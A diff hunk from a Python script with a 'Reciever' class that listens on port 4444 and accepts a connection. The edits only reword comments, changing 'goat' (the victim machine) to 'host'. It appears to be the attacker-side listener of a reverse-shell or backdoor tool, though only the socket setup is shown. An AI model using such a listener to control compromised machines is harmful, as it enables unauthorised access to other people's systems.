@@ -6,11 +6,11 @@ import base64
 class Reciever:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  # incase the connection drops the changing options would help us to reconnect back to the goat
-        listener.bind((ip, port))  # to bind the connection coming from the the goat to our connecting port 4444
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  # incase the connection drops the changing options would help us to reconnect back to the host
+        listener.bind((ip, port))  # to bind the connection coming from the the host to our connecting port 4444
         listener.listen(0)  # to listen for the incoming connection & backlog in here is the number of connections that can be queued before the system starts refusing connections here 0 means that o connections got queued
         print("listening__connection")
-        self.connect, address = listener.accept()  # it accepts the connection from thee goat system
+        self.connect, address = listener.accept()  # it accepts the connection from thee host system
         print("got a connection from " + str(address))
 
     def encode_n_send(self, data):
